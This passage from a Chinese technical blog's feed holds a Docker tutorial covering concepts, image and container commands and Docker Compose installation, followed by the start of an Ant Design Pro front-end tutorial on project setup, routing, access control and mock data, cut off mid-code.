        <content type="html"><![CDATA[<h1 id="docker简介"><a class="markdownIt-Anchor" href="#docker简介"></a> docker简介</h1><h2 id="为什么我们需要docker"><a class="markdownIt-Anchor" href="#为什么我们需要docker"></a> 为什么我们需要docker</h2><p>参考文章：<a href="https://zhuanlan.zhihu.com/p/187505981">什么是Docker？看这一篇干货文章就够了！</a></p><p>从开发到测试到运维，从头到尾搭建三套重复的运行环境，浪费时间和效率，还可能产生各种问题。</p><p>最初的解决方案：搭好一套虚拟机环境然后clone出来，但是存在很大的问题：每开发一个应用就需要部署一个新的虚拟机，且我们想要部署的是应用程序，虚拟机的操作系统所占用的资源是完全浪费掉的。</p><p>为了解决虚拟机存在的问题，诞生了容器技术。</p><h2 id="docker的原理"><a class="markdownIt-Anchor" href="#docker的原理"></a> docker的原理</h2><p>与虚拟机通过操作系统实现隔离不同，容器技术<strong>只隔离应用程序的运行时环境但容器之间可以共享同一个操作系统</strong>，这里的运行时环境指的是程序运行依赖的各种库以及配置。相比虚拟机，容器更加的<strong>轻量级且占用的资源更少</strong>。</p><blockquote><p>注意，容器是一种通用技术，docker只是其中的一种实现，可以让我们方便的创建和使用容器</p></blockquote><p>docker将程序以及程序所有的依赖都打包到docker container，这样你的程序可以在任何环境都会有一致的表现，这里程序运行的依赖也就是容器就好比集装箱，容器所处的操作系统环境就好比货船或港口，<strong>程序的表现只和集装箱有关系(容器)，和集装箱放在哪个货船或者哪个港口(操作系统)没有关系</strong>。</p><h2 id="dockerfile-image和container"><a class="markdownIt-Anchor" href="#dockerfile-image和container"></a> dockerfile、image和container</h2><p>docker中有这样几个概念，可以这样理解：</p><ul><li>dockerfile：指定程序依赖</li><li>image：即可执行程序</li><li>container：运行起来的进程</li></ul><p>写程序需要源代码，那么“写”image就需要dockerfile，dockerfile就是image的源代码，docker就是&quot;编译器&quot;。</p><p>因此我们只需要在dockerfile中指定需要哪些程序、依赖什么样的配置，之后把dockerfile交给“编译器”docker进行“编译”，也就是docker build命令，生成的可执行程序就是image，之后就可以运行这个image了，这就是docker run命令，image运行起来后就是docker container。</p><h1 id="docker安装"><a class="markdownIt-Anchor" href="#docker安装"></a> docker安装</h1><p>linux环境下的docker安装教程：<a href="https://zhuanlan.zhihu.com/p/82269806">史上最全Docker环境安装指南</a></p><p>windows：<a href="https://zhuanlan.zhihu.com/p/441965046">https://zhuanlan.zhihu.com/p/441965046</a></p><h1 id="docker命令"><a class="markdownIt-Anchor" href="#docker命令"></a> docker命令</h1><p>启动docker服务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl start docker</span><br></pre></td></tr></table></figure><h2 id="镜像命令"><a class="markdownIt-Anchor" href="#镜像命令"></a> 镜像命令</h2><ol><li><p><strong>查看镜像</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#查看所有本地主机上的镜像</span></span><br><span class="line">docker images </span><br></pre></td></tr></table></figure><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240328154810691.png" alt="image-20240328154810691" /></p></li><li><p><strong>下载镜像</strong></p><p>这里一般都是拉取<a href="https://hub.docker.com/%E4%B8%8A%E9%9D%A2%E5%B0%81%E8%A3%85%E5%A5%BD%E7%9A%84%E9%95%9C%E5%83%8F">https://hub.docker.com/上面封装好的镜像</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull 镜像名:版本号（默认为latest）</span><br></pre></td></tr></table></figure><p>例如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker pull mysql:5.7</span><br><span class="line">docker pull docker.io/library/mysql:latest</span><br></pre></td></tr></table></figure></li><li><p><strong>删除镜像</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 删除指定的镜像</span></span><br><span class="line">docker rmi -f 镜像<span class="built_in">id</span>      </span><br><span class="line"><span class="comment"># 删除多个镜像</span></span><br><span class="line">docker rmi -f 镜像<span class="built_in">id</span> 镜像<span class="built_in">id</span> 镜像<span class="built_in">id</span> 镜像<span class="built_in">id</span>  </span><br></pre></td></tr></table></figure></li><li><p><strong>镜像的导入导出</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 讲本地镜像导出</span></span><br><span class="line">docker save -o 导出的路径 镜像<span class="built_in">id</span></span><br><span class="line"><span class="comment"># 加载本地的镜像文件</span></span><br><span class="line">docker load -i 镜像文件</span><br><span class="line"><span class="comment"># 修改镜像的名称</span></span><br><span class="line">docker tag 镜像<span class="built_in">id</span> 新镜像名称:版本</span><br></pre></td></tr></table></figure></li></ol><h2 id="容器命令"><a class="markdownIt-Anchor" href="#容器命令"></a> 容器命令</h2><ol><li><p><strong>列出所有正在运行的容器</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps </span><br></pre></td></tr></table></figure></li><li><p><strong>运行容器</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 启动容器</span></span><br><span class="line">docker run 容器<span class="built_in">id</span> </span><br></pre></td></tr></table></figure><ul><li><p>-v：指定本地项目目录与容器内的一个目录建立一个映射关系</p><p>例如：可以通过容器的 <code>/workspace</code> 目录访问本地的 <code>/path/to/your/project</code> 目录下的资源文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --<span class="built_in">rm</span> -v /path/to/your/project:/workspace -t linguist</span><br></pre></td></tr></table></figure></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 重启容器</span></span><br><span class="line">docker restart 容器<span class="built_in">id</span> </span><br><span class="line"><span class="comment"># 停止当前正在运行的容器</span></span><br><span class="line">docker stop 容器<span class="built_in">id</span> </span><br><span class="line"><span class="comment"># 强制停止当前容器</span></span><br><span class="line">docker <span class="built_in">kill</span> 容器<span class="built_in">id</span> </span><br></pre></td></tr></table></figure></li><li><p><strong>删除容器</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 删除指定容器</span></span><br><span class="line">docker <span class="built_in">rm</span> 容器<span class="built_in">id</span> </span><br></pre></td></tr></table></figure><blockquote><p>删除容器和删除镜像的区别：</p><p>删除容器是删除运行时的实例，而删除镜像是删除用于创建容器的基础文件。在删除镜像之前，您需要确保没有任何容器（无论是运行中的还是已停止的）仍在使用该镜像。</p></blockquote></li></ol><h1 id="docker-compose"><a class="markdownIt-Anchor" href="#docker-compose"></a> Docker Compose</h1><p><strong>Docker Compose</strong> 是一个用于管理多容器 Docker 应用的工具，可以理解成是<strong>对 Docker 的进一步封装，帮助开发者以更简单的方式管理多个容器</strong>，适用于多服务应用。可以管理多个容器及其相互依赖性，一键配置所有服务，适合复杂开发环境。通常通过一个 <code>docker-compose.yml</code> 文件定义多容器的配置，包括镜像、网络、挂载卷、环境变量等。</p><h2 id="安装"><a class="markdownIt-Anchor" href="#安装"></a> 安装</h2><p>不能使用pip进行安装（版本过老，会与docker产生不兼容）、不能离线下载再上传到虚拟机（会产生segment error）</p><p>只能采用虚拟机直接在线下载安装的方式，参考：<a href="https://blog.csdn.net/Que_art/article/details/135192479">Docker Compose - 安装和基本使用</a></p><p>如果虚拟机下载速度太慢，可以考虑使用下面的代理镜像进行加速：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -SL https://mirror.ghproxy.com/https://github.com/docker/compose/releases/download/v2.24.1/docker-compose-`<span class="built_in">uname</span> -s`-`<span class="built_in">uname</span> -m` -o /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure><h2 id="命令"><a class="markdownIt-Anchor" href="#命令"></a> 命令</h2><ol><li><p>启动</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><ul><li><code>-d</code> ：让容器在后台运行，而不在当前终端显示容器的输出日志</li></ul></li><li><p>停止</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose down</span><br></pre></td></tr></table></figure></li></ol><h1 id="通过dockerfile创建镜像"><a class="markdownIt-Anchor" href="#通过dockerfile创建镜像"></a> 通过dockerfile创建镜像</h1><p>有的时候我们找到的开源项目在<a href="https://hub.docker.com/%E4%B8%8A%E9%9D%A2%E5%B9%B6%E6%B2%A1%E6%9C%89%E5%B0%81%E8%A3%85%E5%A5%BD%E7%9A%84%E9%95%9C%E5%83%8F%EF%BC%8C%E4%BD%86%E6%98%AF%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E5%9C%A8%E5%85%B6%E9%A1%B9%E7%9B%AE%E7%9B%AE%E5%BD%95%E9%87%8C%E9%9D%A2%E6%89%BE%E5%88%B0">https://hub.docker.com/上面并没有封装好的镜像，但是我们可以在其项目目录里面找到</a> <code>dockerfile</code> ，说明其可以通过docker进行部署。</p><p>我们 <code>git clone</code> 下来项目之后，运行下面的命令根据当前目录下的dockerfile构建Docker镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build [OPTIONS] PATH | URL </span><br></pre></td></tr></table></figure><ul><li>PATH | URL ：表示dockerfile所在的路径</li><li>OPTIONS<ul><li>-t：指定镜像的名字</li></ul></li></ul><blockquote><p>构建容器的时候会依据dockerfile从Docker Hub上拉取对应的环境，所以我们并不需要提前搭建环境。</p></blockquote><p>例如：</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240328161814685.png" alt="image-20240328161814685" /></p>]]></content>
      
      
      <categories>
          
          <category> Docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『web前端开发』基于Ant Design的前端快速开发</title>
      <link href="/posts/f69d.html"/>
      <url>/posts/f69d.html</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h1><p>课题组前端开发项目，主要需求为开发一个Web平台：</p><ul><li>1）基本的注册登录功能</li><li>2）三种权限，不同权限访问不同页面</li><li>3）用户管理界面，管理员可以访问该界面进行用户的增删改查</li><li>4）分页查询、下载功能</li><li>5）token动态验证鉴权</li></ul><p>调研后选择基于Ant Design Pro开发，网上并没有比较全面的Ant Design Pro教程，笔者主要基于<a href="https://pro.ant.design/zh-CN/docs/overview">Ant Design Pro 官方文档</a> 和 <a href="https://blog.csdn.net/qq_40432886/article/details/117294378">Ant Design Pro 从零到一教程</a> 学习，结合chatgpt进行快速开发，本文主要记录学习和解决问题的过程。</p><p>代码开源在：<a href="https://github.com/soda-VV/AntD-Web">基于Ant Design Pro + Flask 的Web系统</a></p><h1 id="技术框架"><a class="markdownIt-Anchor" href="#技术框架"></a> 技术框架</h1><p>如果你第一次使用前端框架，并不了解 umi ，Ant Design，webpack 等开发工具可以参考下面的文档，了解 Ant Design Pro 的技术框架</p><p><a href="https://pro.ant.design/zh-CN/docs/introduction/"> Ant Design Pro 新手须知</a></p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/yuque_diagram.jpg" alt="pro" /></p><p>在我们第一次接触AntD的时候，会遇到两个东西，一个是Ant Design 另一个是Ant Design Pro，</p><ul><li>Ant Design 是一套设计语言与组件库</li><li>Ant Design Pro是一套基于 Ant Design 和 umi 封装的解决方案</li></ul><p>可能这样说还不够直接，说白了就是，Ant Design Pro 是Ant Design 的脚手架，当你构建项目基本框架用Pro ，然后要使用其中一些组件就去Ant Design中去查。</p><h1 id="环境搭建"><a class="markdownIt-Anchor" href="#环境搭建"></a> 环境搭建</h1><p>需要本地安装yarn、node和git</p><ul><li>yarn：facebook发布的一款取代npm的包管理工具。</li><li>node：安装node会顺便自动安装Npm</li></ul><ol><li><p><strong>首先初始化</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装所需要的包</span></span><br><span class="line">npm i @ant-design/pro-cli -g</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建项目</span></span><br><span class="line">npx pro create myapp</span><br></pre></td></tr></table></figure><p>选择simple，执行完成后生成项目目录</p></li><li><p><strong>使用webstorm或者vscode打开项目文件夹，使用npm或yarn安装依赖</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> myapp</span><br><span class="line"></span><br><span class="line">npm install</span><br><span class="line">或者</span><br><span class="line">yarm</span><br></pre></td></tr></table></figure></li><li><p><strong>启动项目</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm start</span><br></pre></td></tr></table></figure><p>访问 <code>http://localhost:8000</code> ，可以看到成功启动</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240721172811475.png" alt="image-20240721172811475" /></p></li></ol><h1 id="项目结构"><a class="markdownIt-Anchor" href="#项目结构"></a> 项目结构</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">├── config                   # umi 配置，包含路由，构建等配置</span><br><span class="line">├── mock                     # 本地模拟数据</span><br><span class="line">├── public</span><br><span class="line">│   └── favicon.png          # Favicon</span><br><span class="line">├── src</span><br><span class="line">│   ├── assets               # 本地静态资源</span><br><span class="line">│   ├── components           # 业务通用组件</span><br><span class="line">│   ├── e2e                  # 集成测试用例</span><br><span class="line">│   ├── layouts              # 通用布局</span><br><span class="line">│   ├── models               # 全局 dva model</span><br><span class="line">│   ├── pages                # 业务页面入口和常用模板</span><br><span class="line">│   ├── services             # 后台接口服务</span><br><span class="line">│   ├── utils                # 工具库</span><br><span class="line">│   ├── locales              # 国际化资源</span><br><span class="line">│   ├── global.less          # 全局样式</span><br><span class="line">│   └── global.ts            # 全局 JS</span><br><span class="line">├── tests                    # 测试工具</span><br><span class="line">├── README.md</span><br><span class="line">└── package.json</span><br></pre></td></tr></table></figure><h2 id="配置文件"><a class="markdownIt-Anchor" href="#配置文件"></a> 配置文件</h2><ul><li><code>config\config.ts</code>  ： webpack的配置</li><li><code>config\proxy.ts</code>  ： 代理的配置</li><li><code>config\router.ts</code>  ： 路由表的配置</li><li><code>src\app.ts</code>  ：运行时配置</li></ul><ol><li><p><strong>config\routes.ts ：路由配置文件</strong></p><p>主要包含以下字段：</p><ul><li><p>path ：访问的路径，即web页面中输入的url</p><ul><li>以 <code>/</code> 开头为绝对路径</li><li>如果不是以 <code>/ </code> 开头会拼接父路由</li></ul></li><li><p>name：该路由的名称，用于国际化（i18n）处理。它会从国际化文件 <code>src\locales\zh-CN\menu.ts</code> 中获取相应的值来作为路由的标题，并在导航菜单或者页面标题中展示出来。例如name为welcome的话就会去文件中找到对应的条目，可能为“欢迎”，显示在页面标题上</p><blockquote><p>这里我们也可以修改这个文件，让条目的名称改变。如果没有在这里找到的话就会直接显示原始的名称</p></blockquote></li><li><p>icon：指定路由对应的图标。这些图标通常会在导航菜单或其他需要展示图标的地方显示。</p></li><li><p>routes：指定该路由下面的子路由</p></li><li><p>component：指定当<u>路径与路由匹配时要渲染的 React 组件</u>。这个字段可以包含绝对路径或者相对路径。相对路径通常是从 <code>src/pages</code> 目录开始查找。</p></li><li><p>redirect： 定义了一个重定向目标路径，当用户访问该路由时，会被自动重定向到指定的路径。</p></li><li><p>layout：用于指定是否使用全局布局组件。</p><ul><li><p><code>layout: false</code> 表示不使用全局布局组件，路由将直接渲染配置的组件，而不包含全局布局。</p></li><li><p>如果没有指定 <code>layout</code> 字段或设置为 <code>true</code>（默认值），则路由会使用全局布局组件，这通常包含导航栏、侧边栏、页脚等公共部分。</p><p>通过配置 <code>layout</code> 字段，可以灵活地决定某些页面是否需要包含全局布局。例如，登录页面通常不需要包含导航栏和侧边栏，因此可以设置 <code>layout: false</code>，而其他页面可能需要全局布局组件，以提供一致的用户体验。</p></li></ul></li><li><p>access：定义该路由的访问权限控制，后面跟的是定义的权限函数。这里是 <code>canAdmin</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  path: &#x27;/admin&#x27;,</span><br><span class="line">  name: &#x27;admin&#x27;,</span><br><span class="line">  icon: &#x27;crown&#x27;,</span><br><span class="line">  access: &#x27;canAdmin&#x27;,</span><br><span class="line">  routes: [</span><br><span class="line">    &#123;</span><br><span class="line">      path: &#x27;/admin&#x27;,</span><br><span class="line">      redirect: &#x27;/admin/sub-page&#x27;,</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      path: &#x27;/admin/sub-page&#x27;,</span><br><span class="line">      name: &#x27;sub-page&#x27;,</span><br><span class="line">      component: &#x27;./Admin&#x27;,</span><br><span class="line">    &#125;,</span><br><span class="line">  ],</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>在项目中有一个 <code>src/access.ts</code> 文件，在其中定义了权限函数 canAdmin。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * @see https://umijs.org/docs/max/access#access</span><br><span class="line"> * */</span><br><span class="line">export default function access(initialState: &#123; currentUser?: API.CurrentUser &#125; | undefined) &#123;</span><br><span class="line">  const &#123; currentUser &#125; = initialState ?? &#123;&#125;;</span><br><span class="line">  return &#123;</span><br><span class="line">    canAdmin: currentUser &amp;&amp; currentUser.access === &#x27;admin&#x27;,</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>后续说到权限控制的时候再详细说明</p></li></ul></li><li><p><strong>config/defaultSettings 网站主题配置文件</strong></p><ul><li><p>title ：网站标题</p></li><li><p>logo：网站logo</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240722161631078.png" alt="image-20240722161631078" /></p></li><li><p>iconfontUrl：网站标签页的icon</p></li></ul></li></ol><h1 id="typescript-基本语法"><a class="markdownIt-Anchor" href="#typescript-基本语法"></a> TypeScript 基本语法</h1><ol><li><p><strong>组件</strong></p><p>TypeScript 本身要求对 props 进行类型检查， JSX并没有此类规定。通过 React.FC，可以确保组件和其子组件遵循正确的类型。</p><ul><li>React.FC 表示 Function Component</li></ul><p>TypeScript 定义组件的基本语法如下：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">React</span> <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Props</span> &#123;</span><br><span class="line">  <span class="attr">message</span>: <span class="built_in">string</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">const</span> <span class="title class_">MyComponent</span>: <span class="title class_">React</span>.<span class="property">FC</span>&lt;<span class="title class_">Props</span>&gt; = <span class="function">(<span class="params">&#123; message &#125;</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;message&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol><h1 id="页面开发方法"><a class="markdownIt-Anchor" href="#页面开发方法"></a> 页面开发方法</h1><h2 id="新增页面"><a class="markdownIt-Anchor" href="#新增页面"></a> 新增页面</h2><p>这里的『页面』指配置了路由，能够通过链接直接访问的模块，要新建一个页面，需要：</p><ol><li><p><strong>绑定路由</strong></p><p>在 <code>config\routes.ts</code> 文件中添加新的页面路由</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  path:&#x27;/demo&#x27;,</span><br><span class="line">  name:&#x27;demo&#x27;,</span><br><span class="line">  icon: &#x27;star&#x27;,</span><br><span class="line">  routes:[</span><br><span class="line">    &#123;</span><br><span class="line">      name: &#x27;demo1&#x27;,</span><br><span class="line">      // path: &#x27;demo1&#x27;,</span><br><span class="line">      path: &#x27;/demo/demo1&#x27;,</span><br><span class="line">      component: &#x27;./demo/demo1&#x27;</span><br><span class="line">    &#125;,&#123;</span><br><span class="line">      name: &#x27;demo2&#x27;,</span><br><span class="line">      path: &#x27;demo2&#x27;,</span><br><span class="line">      component: &#x27;./demo/demo2&#x27;</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><blockquote><p>注意这里不要把path写错了，上面介绍的两种写法都是可以的，但是不要加上 <code>.</code>，不然会无法访问</p></blockquote></li><li><p><strong>新建ts、less 文件</strong></p><ul><li><code>.tsx</code>：构建界面主要文件，这里采用TypeScript的形式进行创建（ts的拓展语言tsx构建的文件，相当于js的拓展语言文件 <code>.jsx</code>）</li><li><code>.less</code>：样式文件，相当于css。咋办暂时不考虑</li></ul><p>1）在 <code>src\page\</code> 下新建文件夹</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240722111058795.png" alt="image-20240722111058795" /></p><p>2）写入 <code>index.tsx</code> 文件（如果你选择jsx进行开发的话，新建 <code>index.js</code> 也是可以的）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">// demo1：index.js</span><br><span class="line">export default () =&gt; &#123;</span><br><span class="line">    return &lt;div&gt;我的第一个AntD-demo1&lt;/div&gt;;</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">// demo2：index.tsx</span><br><span class="line">import React from &quot;react&quot;;</span><br><span class="line">class Index extends React.Component &#123;</span><br><span class="line">    render() &#123;</span><br><span class="line">        return &lt;div&gt;</span><br><span class="line">            我的第一个AntD-demo2</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">export default Index;</span><br></pre></td></tr></table></figure><p>成功创建了页面</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240722142704647.png" alt="image-20240722142704647" /></p></li><li><p><strong>使用ant design组件</strong></p><p>创建的页面比较简单，可以使用一些 ant design 的组件来丰富我们的页面：<a href="https://ant.design/components/overview-cn/">ant design组件总览</a></p><p>打开页面后，我们可以找自己想要的组件。这里我们选择表格组件，找到一个比较满意的代码演示效果，展开代码后复制对应的代码</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240722143800131.png" alt="image-20240722143800131" /></p></li></ol><h2 id="mock模拟数据"><a class="markdownIt-Anchor" href="#mock模拟数据"></a> Mock模拟数据</h2><h3 id="mock文件夹"><a class="markdownIt-Anchor" href="#mock文件夹"></a> mock文件夹</h3><ol><li><p><strong>基本概念</strong></p><p>Mock用来模拟数据，为什么会有它的出现呢？因为现在前后端开发基本是分离的，但是数据结构一般都会先定好，在日常开发中，为了前端的进度不受到后端的影响，常用Mock来做虚拟数据来模拟后端发来的请求。<strong>当你在开发过程中请求某个 API 时，<code>mock</code> 文件夹中的模拟接口会拦截这个请求并返回模拟数据。</strong></p></li><li><p><strong>创建mock</strong></p><p>AntdPro 中约定了mock在根目录的 mock目录 中接入，该目录下的ts文件都是用来模拟数据</p><p>例如我们可以创建一个文件 <code>test.ts</code>：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  <span class="string">&#x27;GET /api/getValue&#x27;</span>: &#123;</span><br><span class="line">    <span class="attr">data</span>:[&#123;</span><br><span class="line">      <span class="attr">name</span>:<span class="string">&#x27;zhangsang&#x27;</span>,</span><br><span class="line">      <span class="attr">sex</span>:<span class="string">&#x27;男&#x27;</span></span><br><span class="line">    &#125;,&#123;</span><br><span class="line">      <span class="attr">name</span>:<span class="string">&#x27;李四&#x27;</span>,</span><br><span class="line">      <span class="attr">sex</span>:<span class="string">&#x27;男&#x27;</span></span><br><span class="line">    &#125;,]</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>当前端代码中对 <code>http://localhost:8000/api/getValue</code> 发起请求后，mock拦截并发挥模拟是数据，我们可以直接在浏览器中访问这个接口。</p><p>可以看到直接返回了我们定义的模拟数据</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240722194059590.png" alt="image-20240722194059590" /></p></li><li><p><strong>创建异步mock</strong></p><p>我们一般发送请求都是异步的，</p><ul><li><p>什么是<strong>异步</strong>：异步行为意味着当你向服务器发送请求（比如通过浏览器访问一个API接口）时，服务器会在后台处理这个请求，而不会阻塞或等待这个请求完成后再处理其他请求。这样，服务器可以同时处理多个请求，提升效率和响应速度。<strong>对前端而言</strong>，前端向API发出请求，这时候后端响应可能需要时间。而异步操作允许前端在等待服务器响应的同时继续执行其他任务。例如，用户点击一个按钮触发数据请求时，前端可以立即更新界面上的按钮状态（如显示“加载中”），而不需要等到请求完成。而如果不使用异步操作，用户界面会被阻塞，导致用户无法进行其他操作。这会严重影响用户体验。</p></li><li><p><strong>如何设置mock发送异步请求</strong>：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;<span class="title class_">Request</span>,<span class="title class_">Response</span>&#125; <span class="keyword">from</span> <span class="string">&quot;express&quot;</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">const</span> <span class="title function_">getList</span> = <span class="keyword">async</span> (<span class="params">req:Request,res:Response</span>)=&gt;&#123;</span><br><span class="line">       <span class="keyword">const</span> result = &#123;</span><br><span class="line">           <span class="attr">success</span>:<span class="literal">true</span>,</span><br><span class="line">           <span class="attr">data</span>:[</span><br><span class="line">               &#123;</span><br><span class="line">                   <span class="attr">id</span>:<span class="number">1</span>,</span><br><span class="line">                   <span class="attr">name</span>:<span class="string">&#x27;test01&#x27;</span>,</span><br><span class="line">                   <span 